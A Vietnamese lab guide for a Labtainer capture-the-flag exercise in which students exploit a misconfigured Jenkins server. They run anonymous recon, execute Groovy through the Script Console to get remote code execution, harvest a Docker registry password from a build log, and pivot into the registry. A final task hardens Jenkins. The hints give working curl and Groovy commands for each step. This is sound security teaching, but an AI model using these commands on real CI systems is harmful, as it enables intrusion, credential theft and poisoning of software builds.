# HƯỚNG DẪN THỰC HÀNH — Lab 8: Chiếm dây chuyền phát hành (CI/CD Jenkins)

- **Mã lab:** `dso-cicd-jenkins`
- **Mức độ:** 3/4 (Nâng cao)
- **Công cụ:** `curl`, `jq`, `grep`, `tar`; Jenkins REST API & Script Console (Groovy); Docker Registry HTTP API v2
- **Kiến thức cần:** HTTP & Basic Auth; `curl` cơ bản; khái niệm CI/CD pipeline/job; đọc được Groovy đơn giản

> Guide này mức **3/4**: cho **khái niệm + hướng tiếp cận + khung lệnh nhiều chỗ trống `<...>`**. Bạn tự ghép chuỗi khai thác. Bí thì mở **Gợi ý mở rộng**. Hai flag (`flag_ci`, `flag_pivot`) sinh riêng theo mã sinh viên.

## Bối cảnh
Có chỗ đứng trong mạng nội bộ CloudNova, bạn (attacker/red-teamer) phát hiện một **Jenkins** cấu hình lỏng: truy cập **ẩn danh gần như toàn quyền**, **Script Console** còn mở, job build **lộ credential**. Chuỗi tấn công: recon ẩn danh → RCE qua Script Console (lấy `flag_ci`) → trộm credential deploy → **pivot** sang **Docker Registry** nội bộ (lấy `flag_pivot`). Chiếm CI = đầu độc được mọi bản build. Cuối cùng đổi vai DevSecOps, hardening để chuỗi này không tái diễn.

```
          mạng ảo Labtainer (172.39.0.0/24)

 [client] 172.39.0.30  (curl, jq, tar) — nơi bạn gõ lệnh
     |  HTTP :8080                              \  pivot :5000
     v                                           v
 [jenkins] 172.39.0.10                       [registry] 172.39.0.20
  - Anonymous full access                     Docker Registry v2 + Basic Auth
  - Script Console /scriptText (Groovy -> RCE) repo acme/app (flag_pivot trong layer)
  - job build-app (build log lộ credential)
  - /var/jenkins_home/flag_ci.txt

 Luồng: client --recon--> jenkins --Script Console RCE--> flag_ci
        --trộm creds từ build log--> pivot registry bằng creds --> flag_pivot
        --(vai DevSecOps)--> hardening jenkins
```

Hostname `jenkins`, `registry` đã phân giải sẵn.

## Khởi động
```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/dso-cicd-jenkins.tar
labtainer dso-cicd-jenkins
```
Nhập email/mã sinh viên khi được hỏi (flag sinh riêng theo mã của bạn).

---

## Nhiệm vụ 1 — `recon_jenkins`: Trinh sát & phát hiện authorization cấu hình sai
**Mục tiêu:** Lấy phiên bản Jenkins và liệt kê job qua REST API **ở trạng thái ẩn danh** — khẳng định lỗ hổng phân quyền.

**Hướng tiếp cận:**
- Phiên bản Jenkins nằm trong HTTP header trả về khi gọi trang gốc (một header tên `X-Jenkins`).
- REST API `/api/json` trả JSON danh sách job. Nếu người **chưa đăng nhập** vẫn đọc được → authorization cho phép ẩn danh.
- Ghi kết quả recon ra file để đối chiếu/chấm điểm.

**Khung lệnh:**
```bash
curl -s -D - -o /dev/null http://jenkins:8080/ | grep -i '<HEADER_PHIÊN_BẢN>' > ~/recon.txt
curl -s "http://jenkins:8080/api/json?pretty=true" | <LỌC_TÊN_JOB> >> ~/recon.txt
cat ~/recon.txt
```
**Hoàn thành khi:** `~/recon.txt` chứa chuỗi phiên bản (`X-Jenkins`) và liệt kê được ≥1 job ở trạng thái ẩn danh.

**Câu hỏi:** Việc người chưa đăng nhập vẫn đọc được danh sách job nói lên cấu hình authorization nào đang sai? Phân biệt *Authentication* và *Authorization* trong Jenkins. → ____

<details><summary>Gợi ý mở rộng</summary>

- Header phiên bản: `X-Jenkins`. Lọc tên job: `grep -o '"name"[ ]*:[ ]*"[^"]*"' | head`. Job của bài tên `build-app`.
</details>

---

## Nhiệm vụ 2 — `rce_script_console`: RCE qua Script Console, lấy `flag_ci`
**Mục tiêu:** Thực thi Groovy tùy ý trên máy `jenkins` để chứng minh RCE và đọc flag thứ nhất.

**Hướng tiếp cận:**
- Endpoint `/scriptText` nhận tham số `script` (Groovy) và trả kết quả text. Groovy chạy **trong tiến trình Jenkins** → đọc được file/kho credential.
- Xác nhận RCE bằng một lệnh in danh tính (`id`), rồi đọc file flag trên máy CI.
- **Chấm điểm:** lưu `flag_ci` vào `~/flag_ci.txt`.

**Khung lệnh:**
```bash
# xác nhận RCE
curl -s --data-urlencode 'script=println "id".execute().text' http://jenkins:8080/scriptText
# đọc flag_ci (tìm đúng đường dẫn rồi đọc)
curl -s --data-urlencode 'script=println new File("<ĐƯỜNG_DẪN_FLAG_CI>").text' \
  http://jenkins:8080/scriptText | tr -d '\r\n ' > ~/flag_ci.txt
cat ~/flag_ci.txt
```
**Hoàn thành khi:** lệnh Groovy trả kết quả thực thi trên `jenkins` (chứng minh RCE) và `~/flag_ci.txt` chứa flag đúng định dạng.

**Câu hỏi:** Vì sao Script Console tương đương RCE toàn quyền? Mã Groovy chạy dưới quyền tiến trình nào, và điều đó nghĩa gì với các credential Jenkins đang giữ? → ____

<details><summary>Gợi ý mở rộng</summary>

- Flag thứ nhất nằm ở `/var/jenkins_home/flag_ci.txt`:
  `curl -s --data-urlencode 'script=println new File("/var/jenkins_home/flag_ci.txt").text' http://jenkins:8080/scriptText`.
- Tìm nếu chưa biết đường dẫn: `script=println "find / -name flag_ci.txt 2>/dev/null".execute().text`.
</details>

---

## Nhiệm vụ 3 — `harvest_creds`: Trích credential của registry
**Mục tiêu:** Săn credential deploy bị lộ (ưu tiên build log của job) để chuẩn bị pivot.

**Hướng tiếp cận:**
- Build log (`consoleText`) của job thường in cả lệnh `docker login` → lộ mật khẩu ngay trên dòng lệnh.
- Lọc log tìm `pass|pwd|token|secret|login|registry`; đặc biệt chú ý tham số kiểu `-p <password>`.
- **Chấm điểm:** lưu riêng mật khẩu registry vào `~/regpass_loot.txt` và cặp đầy đủ vào `~/creds.txt`.

**Khung lệnh:**
```bash
curl -s "http://jenkins:8080/job/build-app/lastBuild/consoleText" > ~/buildlog.txt
grep -Ei 'pass|pwd|token|secret|login|registry|-p ' ~/buildlog.txt
# tách mật khẩu registry (sau cờ -p của docker login) rồi lưu lại:
grep -o '<MẪU_LẤY_MẬT_KHẨU>' ~/buildlog.txt | head -1 | <TÁCH_GIÁ_TRỊ> > ~/regpass_loot.txt
echo "deployer:$(cat ~/regpass_loot.txt)" > ~/creds.txt
cat ~/creds.txt
```
**Hoàn thành khi:** `~/regpass_loot.txt` chứa mật khẩu registry (user `deployer`), lưu kèm `~/creds.txt`.

**Câu hỏi:** Trong các nguồn lộ lọt (build log / biến môi trường job / credential store), nguồn nào nguy hiểm nhất với người chỉ có quyền đọc job (không RCE)? Vì sao in mật khẩu ra build log là lỗi phổ biến nhưng dễ khắc phục nhất? → ____

<details><summary>Gợi ý mở rộng</summary>

- Trong log có dòng `docker login ... -p <password>`. Lấy mật khẩu:
  `grep -o '\-p [^ ]*' ~/buildlog.txt | head -1 | awk '{print $2}' | tr -d '\r\n' > ~/regpass_loot.txt`.
- User registry là `deployer`.
- (Nâng cao) có thể liệt kê credential store bằng Groovy qua `/scriptText` với `CredentialsProvider.lookupCredentials(...)`.
</details>

---

## Nhiệm vụ 4 — `pivot_registry`: Pivot sang Docker Registry, lấy `flag_pivot`
**Mục tiêu:** Dùng credential đánh cắp xác thực với Docker Registry v2 và lấy flag thứ hai (nhúng trong một layer của image).

**Hướng tiếp cận:**
- Registry v2 dùng HTTP Basic Auth. Xác thực rồi liệt kê repo (`/v2/_catalog`) và tag (`/v2/<repo>/tags/list`).
- Lấy **manifest** của image để tìm digest các layer, tải **blob** layer về, giải nén (`tar`) và `grep` chuỗi flag.
- **Chấm điểm:** lưu chuỗi `flag_pivot` vào `~/flag_pivot.txt`.

**Khung lệnh:**
```bash
RP=$(cat ~/regpass_loot.txt)
curl -s -u "deployer:$RP" http://registry:5000/v2/_catalog | jq
curl -s -u "deployer:$RP" http://registry:5000/v2/<REPO>/tags/list | jq
# manifest -> digest layer -> blob -> giải nén -> tìm flag
curl -s -u "deployer:$RP" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  http://registry:5000/v2/<REPO>/manifests/<TAG>
curl -s -u "deployer:$RP" http://registry:5000/v2/<REPO>/blobs/<DIGEST_LAYER> -o ~/layer.tar
cd ~ && tar -xzf ~/layer.tar 2>/dev/null || tar -xf ~/layer.tar
grep -Rai 'flag_pivot' ~ | head
# lưu giá trị flag:
<TRÍCH_GIÁ_TRỊ_FLAG> > ~/flag_pivot.txt
cat ~/flag_pivot.txt
```
**Hoàn thành khi:** xác thực thành công với registry bằng credential đánh cắp và `~/flag_pivot.txt` chứa flag đúng định dạng.

**Câu hỏi:** Đây là MITRE **T1078 Valid Accounts**. Vì sao pivot bằng credential hợp lệ khó phát hiện hơn khai thác lỗ hổng phần mềm? Biện pháp nào (credential riêng mỗi job, scope hẹp, xoay vòng token) giảm thiệt hại khi CI bị chiếm? → ____

<details><summary>Gợi ý mở rộng</summary>

- Image của bài: repo `acme/app`, tag `1.0`. Digest layer: lấy từ manifest bằng
  `grep -o 'sha256:[0-9a-f]\{64\}' | tail -1`.
- Flag nằm trong file `flag_pivot.txt` của layer; trích giá trị:
  `grep -o 'flag_pivot=.*' ~/flag_pivot.txt | head -1 | cut -d= -f2 | tr -d '\r\n '` (ghi đè lại chính file đó).
</details>

---

## Nhiệm vụ 5 — `harden_jenkins`: Hardening Jenkins (DevSecOps)
**Mục tiêu:** Khắc phục cấu hình sai để chuỗi Nhiệm vụ 1–4 không còn thực hiện được: bật xác thực, **thu hồi quyền ẩn danh**, khóa Script Console với người không phải admin. Sau đó kiểm chứng.

**Hướng tiếp cận:**
- Dùng chính Script Console (còn mở) để **đặt lại bảo mật**: tạo một Security Realm có user/password và một Authorization Strategy **tắt đọc ẩn danh**.
- **Đây phải là bước cuối** — sau khi vá, `/scriptText` và `/api/json` ẩn danh sẽ trả 401/403, nên đừng dùng RCE cho việc khác nữa.
- Kiểm chứng: gọi lại `/api/json` và `/scriptText` ở trạng thái ẩn danh, kỳ vọng **401/403**. Ghi kết quả ra `~/harden_verify.txt`.

**Khung lệnh:**
```bash
# đặt lại security realm + tắt anonymous read (Groovy qua Script Console)
curl -s --data-urlencode 'script=<GROOVY_SET_SECURITY_REALM_+_TAT_ANONYMOUS>' \
  http://jenkins:8080/scriptText
sleep 3
# kiểm chứng (kỳ vọng 401/403)
AC=$(curl -s -o /dev/null -w '%{http_code}' http://jenkins:8080/api/json)
SC=$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode 'script=println 1' http://jenkins:8080/scriptText)
printf 'api_anonymous=%s\nscript_anonymous=%s\n' "$AC" "$SC" > ~/harden_verify.txt
cat ~/harden_verify.txt
```
**Hoàn thành khi:** sau hardening, `/api/json` và `/scriptText` ẩn danh trả 401/403 (không còn liệt kê job, không còn RCE); `~/harden_verify.txt` ghi lại kết quả.

**Câu hỏi:** Trong 4 lỗ hổng đã khai thác (anonymous → Script Console RCE → secret lộ → pivot), biện pháp hardening nào có **hiệu quả chi phí cao nhất** (chặn nhiều bước nhất với ít thay đổi nhất)? Giải thích theo least-privilege và defense-in-depth. → ____

<details><summary>Gợi ý mở rộng</summary>

- Groovy mẫu: tạo `HudsonPrivateSecurityRealm(false)` + account admin, rồi
  `FullControlOnceLoggedInAuthorizationStrategy` với `setAllowAnonymousRead(false)`, cuối cùng `Jenkins.instance.save()`.
  ```
  import jenkins.model.*; import hudson.security.*
  def j=Jenkins.instance
  def r=new HudsonPrivateSecurityRealm(false); r.createAccount("admin","StrongPass_123"); j.setSecurityRealm(r)
  def s=new FullControlOnceLoggedInAuthorizationStrategy(); s.setAllowAnonymousRead(false); j.setAuthorizationStrategy(s)
  j.save(); println "hardened"
  ```
</details>

---

## Chấm điểm
```bash
checkwork dso-cicd-jenkins
```
Đạt khi cả 5 mục tiêu = **Y**: `recon_jenkins`, `rce_script_console`, `harvest_creds`, `pivot_registry`, `harden_jenkins`.

> Lưu ý thứ tự: làm `harden_jenkins` **sau cùng**, vì sau khi vá thì Script Console và REST API ẩn danh không còn dùng được. Kiểm tra các file bằng chứng: `~/recon.txt`, `~/flag_ci.txt`, `~/regpass_loot.txt`, `~/flag_pivot.txt`, `~/harden_verify.txt`.
